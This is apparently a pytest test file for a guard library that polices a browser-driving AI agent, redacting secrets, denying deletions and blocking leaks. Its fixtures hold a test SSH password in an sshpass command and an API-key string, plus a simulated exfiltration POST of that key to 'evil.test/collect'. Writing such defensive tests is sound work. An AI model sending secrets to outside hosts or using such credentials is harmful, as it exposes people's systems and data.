import pytest
from agentguard.detect import Vault
from agentguard.guard import GuardedBrowser, GuardViolation, SessionKilled
from agentguard.policy import Policy
from tests.fakes import FakePage

NOTES = ("SSH: sshpass -p '6gfL3J426c5K' ssh adam@backend.nova.com -p 22\n"
         "OpenAI API Key: sk-proj-LeNAUZAwSKTX2cLHtrVsYcXP")

POLICY = Policy.from_dict({
    "on_violation": "kill",
    "global": {
        "never_see": ["api_key", "ssh_credential", "protected"],
        "never_share": ["api_key", "ssh_credential", "protected"],
        "deny": ["delete", "transfer"],
    },
    "unknown_sites": {"deny": ["delete"]},
})
VAULT = Vault({"ssh_pw": "6gfL3J426c5K", "api": "sk-proj-LeNAUZAwSKTX2cLHtrVsYcXP"})


def mk(url="http://localhost:8000/webplatform/?id=drive_amazon_formdel_ssh", body=""):
    page = FakePage(url=url, body=body)
    return GuardedBrowser(page, POLICY, VAULT), page


def test_read_redacts_never_see():
    g, _ = mk(body=NOTES)
    r = g.read()
    assert "6gfL3J426c5K" not in r.text
    assert "sk-proj-LeNAUZAwSKTX2cLHtrVsYcXP" not in r.text
    assert any(i.kind == "read_redacted" for i in g.incidents.entries)


def test_fill_with_protected_value_is_killed():
    g, page = mk()
    with pytest.raises(GuardViolation):
        g.fill("#first_infor", "6gfL3J426c5K", element={"name": "second_infor"})
    assert g.killed and page.closed
    assert ("#first_infor", "6gfL3J426c5K") not in page.fills  # never reached the page


def test_benign_fill_passes():
    g, page = mk()
    r = g.fill("#q", "cheap glasses")
    assert r.ok and ("#q", "cheap glasses") in page.fills


def test_delete_click_denied():
    g, page = mk()
    with pytest.raises(GuardViolation):
        g.click("#del", element={"text": "Delete file", "tag": "button"})
    assert g.killed


def test_network_leak_blocked():
    # block-mode guard so we can inspect the route decision
    pol = Policy.from_dict({"on_violation": "block",
                            "global": {"never_share": ["protected"]},
                            "unknown_sites": {}})
    page = FakePage(url="http://localhost/")
    g = GuardedBrowser(page, pol, VAULT)
    route = page.emit_request("POST", "http://evil.test/collect",
                              body="data=sk-proj-LeNAUZAwSKTX2cLHtrVsYcXP")
    assert route.aborted and not route.continued
    assert any(i.kind == "leak_blocked" for i in g.incidents.entries)


def test_benign_request_passes():
    pol = Policy.from_dict({"on_violation": "block", "global": {"never_share": ["protected"]},
                            "unknown_sites": {}})
    page = FakePage(url="http://localhost/")
    g = GuardedBrowser(page, pol, VAULT)
    route = page.emit_request("GET", "http://localhost/style.css")
    assert route.continued and not route.aborted


def test_killed_session_refuses_further_actions():
    g, _ = mk()
    with pytest.raises(GuardViolation):
        g.click("#del", element={"text": "Delete", "tag": "button"})
    with pytest.raises(SessionKilled):
        g.read()
